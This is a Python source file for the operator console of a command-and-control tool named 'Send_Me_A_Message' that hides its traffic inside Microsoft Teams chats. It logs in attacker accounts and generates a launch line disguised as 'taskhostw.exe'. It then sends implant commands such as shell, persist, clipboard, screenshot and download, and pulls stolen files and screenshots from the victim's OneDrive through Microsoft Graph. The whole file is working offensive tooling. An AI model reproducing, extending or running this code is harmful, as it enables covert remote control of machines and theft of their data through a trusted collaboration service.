"""
Send_Me_A_Message
"""
from __future__ import annotations

import argparse
import asyncio
import html as html_module
import os
import sys
import threading
import time
from datetime import datetime
from typing import Optional
from textual.app import App, ComposeResult
from textual.message import Message
from textual.binding import Binding
from textual.containers import Container, Horizontal, Vertical
from textual.css.query import NoMatches
from textual.reactive import reactive
from textual.screen import Screen
from textual.widgets import (
    Button,
    Footer,
    Header,
    Input,
    Label,
    RichLog,
    Static,
)
from textual.widget import Widget


try:
    from teams_server import (
        login,
        resolve_thread,
        send_raw,
        fetch_messages,
        refresh_all_tokens,
        build_token_blob_b64,
        token_rotation_loop,
        _hb_lock,
        _hb_state,
        _hb_get_status,
        _hb_format_age,
        hb_reader_loop,
        decrypt_file,
        encrypt_file,
        CMD_START, CMD_END,
        OUT_START, OUT_END,
        ERR_START, ERR_END,
        HB_START,  HB_END,
        BLOB_START, BLOB_END,
        CHUNK_START,        # "##CHUNK##"
        CHUNK_END,          # "##END##"
        CHUNK_START_MARKER, # "##CHUNK_START##"
        CHUNK_DONE,         # "##CHUNK_DONE##"
        UPLOAD_CHUNK_BYTES,
        SERVER_POLL_INTERVAL,
        SERVER_POLL_TIMEOUT,
        TOKEN_ROTATION_INTERVAL,
        _extract_between,
        _dbg,
    )
except ImportError as _e:
    print(f"[!] Could not import teams_server.py: {_e}")
    print("    Make sure teams_server.py is in the same directory.")
    sys.exit(1)

import base64
import urllib.parse
import requests

#########################################################################################

_C2_COMMANDS = [
    "whoami", "hostname", "pwd", "getpid", "uptime","ls", "cat", "mkdir", "rm", "mv", "cp","ps", "kill","sysinfo", "drives", "env", "getenv","clipboard","ipconfig", "netstat", "ping", "dns","screenshot","download", "upload","isadmin", "privs", "persist", "unpersist","shell","help","exit", "quit",
]

#########################################################################################
CSS = """

Screen {
    background: #0d1117;
}

#clients-panel {
    height: 5;
    border: solid #30363d;
    border-title-color: #58a6ff;
    padding: 0 1;
    background: #161b22;
}

#clients-content {
    height: 3;
    overflow-y: auto;
}

#console-panel {
    border: solid #30363d;
    border-title-color: #58a6ff;
    padding: 0 1;
    background: #0d1117;
}

#console-log {
    background: #0d1117;
    color: #c9d1d9;
    scrollbar-color: #30363d;
    scrollbar-background: #0d1117;
}

#command-panel {
    height: 7;
    border: solid #30363d;
    border-title-color: #58a6ff;
    padding: 0 1;
    background: #161b22;
}

#cmd-input {
    background: #0d1117;
    color: #c9d1d9;
    border: none;
    height: 3;
}

#cmd-input:focus {
    border: none;
    background: #0d1117;
}

#tab-hints {
    color: #8b949e;
    height: 1;
    overflow: hidden;
}

SetupScreen {
    background: #0d1117;
    align: center middle;
}

#setup-box {
    width: 70;
    height: auto;
    border: double #58a6ff;
    padding: 1 2;
    background: #161b22;
}

#setup-title {
    text-align: center;
    color: #58a6ff;
    text-style: bold;
    margin-bottom: 1;
}

.setup-label {
    color: #8b949e;
    margin-top: 1;
}

.setup-input {
    background: #0d1117;
    color: #c9d1d9;
    border: solid #30363d;
    margin-bottom: 0;
}

.setup-input:focus {
    border: solid #58a6ff;
}

#setup-btn {
    margin-top: 1;
    background: #238636;
    color: #ffffff;
    border: none;
    width: 100%;
}

#setup-btn:hover {
    background: #2ea043;
}

#setup-error {
    color: #f85149;
    margin-top: 1;
    text-align: center;
}
"""

#########################################################################################
_tui_app: Optional["C2App"] = None 


def _tui_log(msg: str, style: str = "normal") -> None:
    if _tui_app is not None:
        _tui_app.call_from_thread(_tui_app.append_console, msg, style)

#########################################################################################

def _tui_update_client(status: str, age: str, seq: Optional[int]) -> None:
    if _tui_app is not None:
        _tui_app.call_from_thread(_tui_app.update_client_panel, status, age, seq)


#########################################################################################
class SetupScreen(Screen):
    def compose(self) -> ComposeResult:
        yield Container(
            Static("Send_Me_A_Messge", id="setup-title"),
            Label("Server email (User A):", classes="setup-label"),
            Input(placeholder="usernameA@outlook.com", id="inp-server-user", classes="setup-input"),
            Label("Server password (User A):", classes="setup-label"),
            Input(placeholder="••••••••", password=True, id="inp-server-pass", classes="setup-input"),
            #Label("Client email (User B):", classes="setup-label"),
            #Input(placeholder="usernameB@outlook.com", id="inp-contact", classes="setup-input"),
            Label("Client email (User B):", classes="setup-label"),
            Input(placeholder="usernameB@outlook.com", id="inp-client-user", classes="setup-input"),
            Label("Client password (User B):", classes="setup-label"),
            Input(placeholder="••••••••", password=True, id="inp-client-pass", classes="setup-input"),
            Button("Connect →", id="setup-btn", variant="success"),
            Static("", id="setup-error"),
            id="setup-box",
        )

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "setup-btn":
            self._submit()

#########################################################################################
    def on_input_submitted(self, event: Input.Submitted) -> None:
        self._submit()

#########################################################################################
    def _submit(self) -> None:
        server_user = self.query_one("#inp-server-user", Input).value.strip()
        server_pass = self.query_one("#inp-server-pass", Input).value.strip()
        #contact     = self.query_one("#inp-contact",     Input).value.strip()
        client_user = self.query_one("#inp-client-user", Input).value.strip()
        client_pass = self.query_one("#inp-client-pass", Input).value.strip()
        contact = client_user
        
        err = self.query_one("#setup-error", Static)

        if not server_user or not server_pass or not contact:
            err.update("[!] Server email, password, and contact are required.")
            return

        err.update("[*] Connecting…")
        self.app.post_message(
            SetupScreen.Credentials(
                server_user=server_user,
                server_pass=server_pass,
                contact=contact,
                client_user=client_user,
                client_pass=client_pass,
            )
        )
#########################################################################################

    class Credentials(Message):
        def __init__(self, *, server_user, server_pass, contact,client_user, client_pass):
            super().__init__()
            self.server_user = server_user
            self.server_pass = server_pass
            self.contact     = contact
            self.client_user = client_user
            self.client_pass = client_pass


#########################################################################################
class C2App(App):
    CSS = CSS
    BINDINGS = [
        Binding("ctrl+c", "quit", "Quit", show=True),
        Binding("tab",    "complete", "Complete", show=True),
        Binding("escape", "clear_input", "Clear", show=False),
    ]


    client_status: reactive[str] = reactive("UNKNOWN")

    def __init__(self, args: argparse.Namespace):
        super().__init__()
        self._args = args
        self._server_tokens: Optional[dict] = None
        self._thread_id: Optional[str]      = None
        self._debug: bool                   = args.debug
        self._history: list[str] = []
        self._history_idx: int   = -1
        self._tab_matches: list[str] = []
        self._tab_idx: int = 0
        self._waiting_response: bool = False

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Vertical():
            with Container(id="clients-panel") as cp:
                cp.border_title = " CLIENTS "
                yield Static("  Waiting for connection…", id="clients-content")
            with Container(id="console-panel") as con:
                con.border_title = " CONSOLE "
                yield RichLog(id="console-log", markup=True, wrap=True,
                              highlight=False, auto_scroll=True)
            with Container(id="command-panel") as cmd:
                cmd.border_title = " COMMAND "
                yield Input(placeholder="ART Loves You", id="cmd-input")
                yield Static("", id="tab-hints")
        yield Footer()

    def on_mount(self) -> None:
        global _tui_app
        _tui_app = self

        if self._args.username and self._args.password and self._args.contact:
            self.append_console(
                "[bold #58a6ff]Teams [/] — connecting…", "info"
            )
            threading.Thread(
                target=self._connect,
                args=(
                    self._args.username,
                    self._args.password,
                    self._args.contact,
                    self._args.username_client,
                    self._args.password_client,
                ),
                daemon=True,
                name="Connect",
            ).start()
        else:
            self.push_screen(SetupScreen())

    def on_setup_screen_credentials(self, msg: SetupScreen.Credentials) -> None:
        self.pop_screen()
        self.append_console(
            "[bold #58a6ff]Teams [/] — connecting…", "info"
        )
        threading.Thread(
            target=self._connect,
            args=(
                msg.server_user,
                msg.server_pass,
                msg.contact,
                msg.client_user,
                msg.client_pass,
            ),
            daemon=True,
            name="Connect",
        ).start()

    def _connect(self, server_user: str, server_pass: str, contact: str,
                 client_user: str, client_pass: str) -> None:

        try:
            _tui_log("[*] Logging in as Server (User A)…", "info")
            self._server_tokens = login(server_user, server_pass, debug=self._debug)
            self._thread_id     = resolve_thread(contact, self._server_tokens,
                                                 debug=self._debug)
            _tui_log(f"[+] Server ready. Thread: {self._thread_id[:40]}…", "success")

            client_tokens_for_rotation = None
            if client_user and client_pass:
                _tui_log("[*] Logging in as Client (User B) for token blob…", "info")
                try:
                    client_tokens = login(client_user, client_pass, debug=self._debug)
                    client_tokens["server_contact"] = server_user
                    blob_b64 = build_token_blob_b64(client_tokens)
                    _tui_log("[+] Token blob ready:", "success")
                    _tui_log(f"[bold #f0e68c]    taskhostw.exe -l {blob_b64}[/]", "blob")
                    try:
                        blob_path = os.path.join(
                            os.path.dirname(os.path.abspath(__file__)),
                            "blob.txt"
                        )
                        with open(blob_path, "w", encoding="utf-8") as _bf:
                            _bf.write(f"taskhostw.exe -l {blob_b64}\n")
                        _tui_log(f"[dim]    (saved to {blob_path})[/]", "info")
                    except Exception as _be:
                        _tui_log(f"[dim]    (could not save blob.txt: {_be})[/]", "warn")
                    try:
                        blob_msg = f"{BLOB_START}{blob_b64}{BLOB_END}"
                        send_raw(self._thread_id, blob_msg,
                                 self._server_tokens, self._debug)
                    except Exception:
                        pass
                    client_tokens_for_rotation = client_tokens
                except Exception as e:
                    _tui_log(f"[!] Client login failed: {e}", "warn")

            threading.Thread(
                target=self._hb_monitor_loop,
                daemon=True,
                name="HBMonitor",
            ).start()

            if client_tokens_for_rotation is not None:
                threading.Thread(
                    target=token_rotation_loop,
                    args=(client_tokens_for_rotation, self._thread_id,
                          self._server_tokens, self._debug),
                    daemon=True,
                    name="TokenRotation",
                ).start()
                _tui_log(
                    f"[*] Token rotation started (every {TOKEN_ROTATION_INTERVAL}s)info"
                )
            self.call_from_thread(self._enable_input)

        except Exception as e:
            _tui_log(f"[-] Connection failed: {e}", "error")

    def _enable_input(self) -> None:
        try:
            inp = self.query_one("#cmd-input", Input)
            inp.focus()
        except NoMatches:
            pass

    def _hb_monitor_loop(self) -> None:
        last_hb_msg_id = 0
        try:
            initial = fetch_messages(self._thread_id, self._server_tokens,self._debug)
            if initial:
                last_hb_msg_id = int(initial[-1].get("id", "0"))
        except Exception:
            pass

        prev_status = "UNKNOWN"

        while True:
            time.sleep(30)  # HB_MONITOR_INTERVAL

            try:
                messages = fetch_messages(self._thread_id, self._server_tokens,self._debug)
            except Exception as e:
                _dbg(f"[HB] fetch error: {e}", self._debug)
                continue

            for msg in messages:
                msg_id  = int(msg.get("id", "0"))
                content = html_module.unescape(msg.get("content", "") or "")
                if msg_id <= last_hb_msg_id:
                    continue
                last_hb_msg_id = max(last_hb_msg_id, msg_id)
                if HB_START not in content or HB_END not in content:
                    continue
                import json as _json
                raw_payload = _extract_between(content, HB_START, HB_END).strip()
                try:
                    beacon  = _json.loads(raw_payload)
                    seq_val = int(beacon.get("seq", 0))
                except Exception:
                    seq_val = None
                with _hb_lock:
                    _hb_state["last_ts"]  = time.time()
                    _hb_state["last_seq"] = seq_val
                    _hb_state["status"]   = "UP"

            new_status = _hb_get_status()
            with _hb_lock:
                _hb_state["status"] = new_status

            age_str = _hb_format_age()
            seq_val = _hb_state.get("last_seq")
            _tui_update_client(new_status, age_str, seq_val)

            if new_status != prev_status:
                colour = {"UP": "green", "SILENT": "yellow","DEAD": "red", "UNKNOWN": "grey"}.get(new_status, "white")
                _tui_log(
                    f"[!] Client status: [{colour}]{prev_status} → {new_status}[/]  "
                    f"(last HB: {age_str})",
                    "warn"
                )
                prev_status = new_status

#########################################################################################

    def append_console(self, text: str, style: str = "normal") -> None:
        try:
            log = self.query_one("#console-log", RichLog)
        except NoMatches:
            return

        ts = datetime.now().strftime("%H:%M:%S")
        colour_map = {
            "info":    "#58a6ff",
            "success": "#3fb950",
            "error":   "#f85149",
            "warn":    "#d29922",
            "cmd":     "#79c0ff",
            "out":     "#c9d1d9",
            "blob":    "#f0e68c",
            "normal":  "#c9d1d9",
        }
        colour = colour_map.get(style, "#c9d1d9")
        if "[" not in text:
            text = f"[{colour}]{text}[/]"
        log.write(f"[#8b949e]{ts}[/]  {text}")


    def update_client_panel(self, status: str, age: str,
                            seq: Optional[int]) -> None:
        try:
            panel = self.query_one("#clients-content", Static)
        except NoMatches:
            return

        colour = {
            "UP":      "green",
            "SILENT":  "yellow",
            "DEAD":    "red",
            "UNKNOWN": "grey",
        }.get(status, "white")

        bullet = "●" if status == "UP" else "○"
        seq_str = f" | seq: {seq}" if seq is not None else ""
        panel.update(
            f"  [{colour}]{bullet}[/]  [bold]Client[/]  "
            f"[{colour}][{status} | {age}{seq_str}][/]"
        )
        
#########################################################################################
    def on_input_submitted(self, event: Input.Submitted) -> None:
        if event.input.id != "cmd-input":
            return
        raw_cmd = event.value.strip()
        if not raw_cmd:
            return

        if not self._history or self._history[-1] != raw_cmd:
            self._history.append(raw_cmd)
        self._history_idx = len(self._history)

        event.input.value = ""
        try:
            self.query_one("#tab-hints", Static).update("")
        except NoMatches:
            pass

        if raw_cmd.lower() in ("exit", "quit"):
            self.exit()
            return

        if self._server_tokens is None or self._thread_id is None:
            self.append_console("[!] Not connected yet.", "warn")
            return

        if self._waiting_response:
            self.append_console("[!] Waiting for previous command response…", "warn")
            return

        self.append_console(f"[bold #79c0ff]→[/] {raw_cmd}", "cmd")

        threading.Thread(
            target=self._dispatch_command,
            args=(raw_cmd,),
            daemon=True,
            name="Dispatch",
        ).start()

#########################################################################################
    def on_key(self, event) -> None:
        try:
            inp = self.query_one("#cmd-input", Input)
        except NoMatches:
            return

        if event.key == "up":
            if self._history and self._history_idx > 0:
                self._history_idx -= 1
                inp.value = self._history[self._history_idx]
                inp.cursor_position = len(inp.value)
            event.prevent_default()

        elif event.key == "down":
            if self._history_idx < len(self._history) - 1:
                self._history_idx += 1
                inp.value = self._history[self._history_idx]
                inp.cursor_position = len(inp.value)
            elif self._history_idx == len(self._history) - 1:
                self._history_idx = len(self._history)
                inp.value = ""
            event.prevent_default()

#########################################################################################
    def action_complete(self) -> None:
        try:
            inp = self.query_one("#cmd-input", Input)
            hints = self.query_one("#tab-hints", Static)
        except NoMatches:
            return

        current = inp.value
        tokens  = current.lstrip().split()

        if not tokens or (len(tokens) == 1 and not current.endswith(" ")):
            prefix = tokens[0] if tokens else ""
            matches = [c for c in _C2_COMMANDS if c.startswith(prefix)]
            if not matches:
                return
            if len(matches) == 1:
                inp.value = matches[0] + " "
                inp.cursor_position = len(inp.value)
                hints.update("")
                self._tab_matches = []
            else:
                if self._tab_matches != matches:
                    self._tab_matches = matches
                    self._tab_idx = 0
                else:
                    self._tab_idx = (self._tab_idx + 1) % len(matches)
                inp.value = matches[self._tab_idx] + " "
                inp.cursor_position = len(inp.value)
                hint_str = "  ".join(
                    f"[bold]{m}[/]" if i == self._tab_idx else m
                    for i, m in enumerate(matches)
                )
                hints.update(hint_str)
        else:
            import glob
            path_prefix = tokens[-1] if tokens else ""
            fs_matches  = glob.glob(path_prefix + "*")
            fs_matches  = [
                (m + "/" if os.path.isdir(m) else m) for m in fs_matches
            ]
            if not fs_matches:
                return
            if len(fs_matches) == 1:
                base = current[:current.rfind(tokens[-1])]
                inp.value = base + fs_matches[0]
                inp.cursor_position = len(inp.value)
                hints.update("")
            else:
                if self._tab_matches != fs_matches:
                    self._tab_matches = fs_matches
                    self._tab_idx = 0
                else:
                    self._tab_idx = (self._tab_idx + 1) % len(fs_matches)
                base = current[:current.rfind(tokens[-1])]
                inp.value = base + fs_matches[self._tab_idx]
                inp.cursor_position = len(inp.value)
                hints.update("  ".join(
                    f"[bold]{m}[/]" if i == self._tab_idx else m
                    for i, m in enumerate(fs_matches[:12])
                ))


#########################################################################################
    def action_clear_input(self) -> None:
        """Escape — clear the command input."""
        try:
            inp = self.query_one("#cmd-input", Input)
            inp.value = ""
            self.query_one("#tab-hints", Static).update("")
        except NoMatches:
            pass


#########################################################################################
    def _dispatch_command(self, raw_cmd: str) -> None:
        self._waiting_response = True
        try:
            parts = raw_cmd.split(None, 1)
            verb  = parts[0].lower()

            if verb == "upload":
                if len(parts) < 2:
                    _tui_log("Usage: upload <local_path> [remote_filename]", "warn")
                    return
                arg_str = parts[1]
                sub     = arg_str.rsplit(None, 1)
                if len(sub) == 2 and not os.path.isfile(arg_str):
                    local_path  = sub[0]
                    remote_name = sub[1]
                else:
                    local_path  = arg_str
                    remote_name = os.path.basename(local_path)
                if not os.path.isfile(local_path):
                    _tui_log(f"[-] File not found: {local_path}", "error")
                    return
                self._do_upload(local_path, remote_name)
                return

            cmd_msg      = f"{CMD_START}{raw_cmd}{CMD_END}"
            sent_at_epoch = int(time.time() * 1000)
            try:
                send_raw(self._thread_id, cmd_msg, self._server_tokens, self._debug)
            except RuntimeError as e:
                _tui_log(f"[-] Send failed: {e}", "error")
                return
                
            deadline = time.time() + SERVER_POLL_TIMEOUT
            while time.time() < deadline:
                time.sleep(SERVER_POLL_INTERVAL)
                try:
                    messages = fetch_messages(self._thread_id, self._server_tokens,self._debug)
                except Exception as e:
                    _dbg(f"fetch error: {e}", self._debug)
                    continue

                for msg in messages:
                    msg_id  = int(msg.get("id", "0"))
                    content = html_module.unescape(msg.get("content", "") or "")
                    props   = msg.get("properties", {})
                    if msg.get("type") != "Message" or "deletetime" in props:
                        continue
                    if msg_id <= sent_at_epoch:
                        continue
                    if CMD_START in content:
                        continue

                    if OUT_START in content and OUT_END in content:
                        output = _extract_between(content, OUT_START, OUT_END)
                        sender = msg.get("imdisplayname", "Client")
                        self._handle_output(output, sender)
                        deadline = 0
                        break

                    if ERR_START in content and ERR_END in content:
                        error  = _extract_between(content, ERR_START, ERR_END)
                        sender = msg.get("imdisplayname", "Client")
                        _tui_log(f"[←] ERROR from {sender}:\n{error.strip()}", "error")
                        deadline = 0
                        break

                if deadline == 0:
                    break
            else:
                _tui_log(
                    f"[-] Timeout: no response within {SERVER_POLL_TIMEOUT}s.",
                    "warn"
                )

        finally:
            self._waiting_response = False


    def _handle_output(self, output: str, sender: str) -> None:
        if output.startswith("[DOWNLOAD_URL "):
            inner = output[len("[DOWNLOAD_URL "): -1]
            if " " not in inner:
                _tui_log(f"[-] Malformed DOWNLOAD_URL: {output[:80]}", "error")
                return
            fname, share_id_val = inner.rsplit(" ", 1)
            fname = fname.strip(); share_id_val = share_id_val.strip()
            if fname and share_id_val:
                _tui_log(f"[*] Fetching '{fname}' from Client's OneDrive…", "info")
                try:
                    graph_token = self._server_tokens.get("graph_token", "")
                    r_share = self._server_tokens["session"].get(
                        f"https://graph.microsoft.com/v1.0/shares/"
                        f"{urllib.parse.quote(share_id_val)}/driveItem"
                        f"?select=restricted,webDavUrl,%40microsoft.graph.downloadUrl,file,name",
                        headers={
                            "Authorization": f"Bearer {graph_token}",
                            "Prefer": "redeemSharingLink,getShortLivedDownloadUrl",
                            "Scenariotype": "AUO",
                            "Scenario": "DownloadFile_TeamsMSAUser",
                            "Osname": "Windows",
                            "Accept": "*/*",
                            "Origin": "https://teams.live.com",
                            "Referer": "https://teams.live.com/",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/150.0.0.0 Safari/537.36 (KHTML, like Gecko)Chrome/150.0.0.0 Safari/537.36",
                        },
                        timeout=30,
                    )
                    dl_url = r_share.json().get("@microsoft.graph.downloadUrl", "") \
                             if r_share.status_code == 200 else ""
                    if dl_url:
                        r_dl = self._server_tokens["session"].get(
                            dl_url,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/150.0.0.0 Safari/537.36",
                                "Accept": "text/html,application/xhtml+xml,*/*",
                                "Referer": "https://teams.live.com/",
                            },
                            allow_redirects=True, timeout=300,
                        )
                        if r_dl.status_code == 200:
                            plain     = decrypt_file(r_dl.content)
                            save_path = os.path.join(os.getcwd(), fname)
                            with open(save_path, "wb") as fh:
                                fh.write(plain)
                            _tui_log(
                                f"[+] File saved: {save_path} "
                                f"({len(plain):,} bytes, decrypted OK)",
                                "success"
                            )
                        else:
                            _tui_log(f"[-] Download failed: HTTP {r_dl.status_code}", "error")
                    else:
                        _tui_log("[-] Could not resolve downloadUrl from shareId", "error")
                except Exception as e:
                    _tui_log(f"[-] File fetch error: {e}", "error")
            return


        if output.startswith("[SCREENSHOT_URL "):
            inner = output[len("[SCREENSHOT_URL "): -1]
            if " " not in inner:
                _tui_log(f"[-] Malformed SCREENSHOT_URL: {output[:80]}", "error")
                return
            fname, share_id_val = inner.rsplit(" ", 1)
            fname = fname.strip(); share_id_val = share_id_val.strip()
            if fname and share_id_val:
                _tui_log(f"[*] Fetching screenshot '{fname}'…", "info")
                try:
                    graph_token = self._server_tokens.get("graph_token", "")
                    r_share = self._server_tokens["session"].get(
                        f"https://graph.microsoft.com/v1.0/shares/"
                        f"{urllib.parse.quote(share_id_val)}/driveItem"
                        f"?select=restricted,webDavUrl,%40microsoft.graph.downloadUrl,file,name",
                        headers={
                            "Authorization": f"Bearer {graph_token}",
                            "Prefer": "redeemSharingLink,getShortLivedDownloadUrl",
                            "Scenariotype": "AUO",
                            "Scenario": "DownloadFile_TeamsMSAUser",
                            "Osname": "Windows",
                            "Accept": "*/*",
                            "Origin": "https://teams.live.com",
                            "Referer": "https://teams.live.com/",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/150.0.0.0 Safari/537.36",
                                          
                        },
                        timeout=30,
                    )
                    dl_url = r_share.json().get("@microsoft.graph.downloadUrl", "") \
                             if r_share.status_code == 200 else ""
                    if dl_url:
                        r_dl = self._server_tokens["session"].get(
                            dl_url,
                            headers={
                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko)Chrome/150.0.0.0 Safari/537.36",
                                "Accept": "*/*",
                                "Referer": "https://teams.live.com/",
                            },
                            allow_redirects=True, timeout=300,
                        )
                        if r_dl.status_code == 200:
                            plain     = decrypt_file(r_dl.content)
                            ts        = time.strftime("%Y%m%d_%H%M%S")
                            save_path = os.path.join(os.getcwd(), f"screenshot_{ts}.png")
                            with open(save_path, "wb") as fh:
                                fh.write(plain)
                            _tui_log(
                                f"[+] Screenshot saved: {save_path} ({len(plain):,} bytes)",
                                "success"
                            )
                        else:
                            _tui_log(f"[-] Screenshot download failed: HTTP {r_dl.status_code}",
                                     "error")
                    else:
                        _tui_log("[-] Could not resolve downloadUrl for screenshot", "error")
                except Exception as e:
                    _tui_log(f"[-] Screenshot fetch error: {e}", "error")
            return


        if output.startswith("[SCREENSHOT_B64 ") or output.startswith("[SCREENSHOT "):
            inner = output.split(" ", 1)[1].rstrip("]") if " " in output else ""
            if " " in inner:
                fname, b64_data = inner.rsplit(" ", 1)
                try:
                    raw       = base64.b64decode(b64_data.strip())
                    ts        = time.strftime("%Y%m%d_%H%M%S")
                    save_path = os.path.join(os.getcwd(), f"screenshot_{ts}.png")
                    with open(save_path, "wb") as fh:
                        fh.write(raw)
                    _tui_log(f"[+] Screenshot saved: {save_path}", "success")
                except Exception as e:
                    _tui_log(f"[-] Screenshot save error: {e}", "error")
            return


        if output.startswith("[DOWNLOAD "):
            inner = output[len("[DOWNLOAD "): -1]
            if " " in inner:
                fname, b64_data = inner.rsplit(" ", 1)
                try:
                    raw       = base64.b64decode(b64_data.strip())
                    save_path = os.path.join(os.getcwd(), fname.strip())
                    with open(save_path, "wb") as fh:
                        fh.write(raw)
                    _tui_log(f"[+] File saved: {save_path} ({len(raw):,} bytes)", "success")
                except Exception as e:
                    _tui_log(f"[-] File save error: {e}", "error")
            return


        _tui_log(f"[←] [bold]{sender}[/]:", "out")
        for line in output.strip().splitlines():
            _tui_log(f"    {line}", "out")

    def _do_upload(self, local_path: str, remote_name: str) -> None:
        try:
            raw_data     = open(local_path, "rb").read()
            enc_data     = encrypt_file(raw_data)
            b64_full     = base64.b64encode(enc_data).decode()
            chunk_size   = UPLOAD_CHUNK_BYTES * 4 // 3 + 4
            chunks       = [b64_full[i:i+chunk_size]
                            for i in range(0, len(b64_full), chunk_size)]
            total        = len(chunks)
            file_size_kb = len(raw_data) / 1024

            _tui_log(
                f"[*] Sending '[bold]{remote_name}[/]' "
                f"({file_size_kb:.1f} KB) in {total} chunk(s)…",
                "info"
            )

            # Step 1: announce
            start_msg = f"{CHUNK_START_MARKER}{remote_name}|{total}{CHUNK_END}"
            send_raw(self._thread_id, start_msg, self._server_tokens, self._debug)
            _tui_log(f"  [  0%] transfer announced ({total} chunks)", "info")
            time.sleep(2)

            sent_at_epoch = int(time.time() * 1000)

            # Step 2: chunks with 3-second delay
            for idx, chunk_b64 in enumerate(chunks):
                msg = f"{CHUNK_START}{remote_name}|{total}|{idx}|{chunk_b64}{CHUNK_END}"
                send_raw(self._thread_id, msg, self._server_tokens, self._debug)
                pct = int((idx + 1) / total * 100)
                _tui_log(
                    f"  [{pct:3d}%] chunk {idx+1}/{total} "
                    f"({len(chunk_b64)} chars)",
                    "info"
                )
                if idx < total - 1:
                    time.sleep(3)

            done_msg = f"{CHUNK_DONE}{remote_name}{CHUNK_END}"
            send_raw(self._thread_id, done_msg, self._server_tokens, self._debug)
            _tui_log("[*] All chunks sent. Waiting for Client acknowledgement…", "info")

            deadline = time.time() + SERVER_POLL_TIMEOUT + total * 4
            while time.time() < deadline:
                time.sleep(SERVER_POLL_INTERVAL)
                messages = fetch_messages(self._thread_id, self._server_tokens,
                                          self._debug)
                for msg in messages:
                    msg_id  = int(msg.get("id", "0"))
                    content = html_module.unescape(msg.get("content", "") or "")
                    if msg_id <= sent_at_epoch or CHUNK_START in content:
                        continue
                    if OUT_START in content and OUT_END in content:
                        ack = _extract_between(content, OUT_START, OUT_END)
                        _tui_log(f"[+] Client: {ack.strip()}", "success")
                        deadline = 0
                        break
                    if ERR_START in content and ERR_END in content:
                        err = _extract_between(content, ERR_START, ERR_END)
                        _tui_log(f"[-] Client error: {err.strip()}", "error")
                        deadline = 0
                        break
                if deadline == 0:
                    break
            else:
                _tui_log("[-] Timeout: no acknowledgement from Client.", "warn")

        except Exception as e:
            _tui_log(f"[-] Upload failed: {e}", "error")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="TUI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-u",  "--username",default="",help="Server account email (User A)")
    parser.add_argument("-p",  "--password",default="",help="Server account password")
    parser.add_argument("-c",  "--contact",default="",help="Client contact email (User B)")
    parser.add_argument("-uc", "--username-client", default="",dest="username_client",help="Client email for token blob (optional)")
    parser.add_argument("-pc", "--password-client", default="",dest="password_client",help="Client password for token blob (optional)")
    parser.add_argument("--debug", action="store_true",help="Verbose debug output")
    args = parser.parse_args()

    app = C2App(args)
    app.run()


if __name__ == "__main__":
    main()
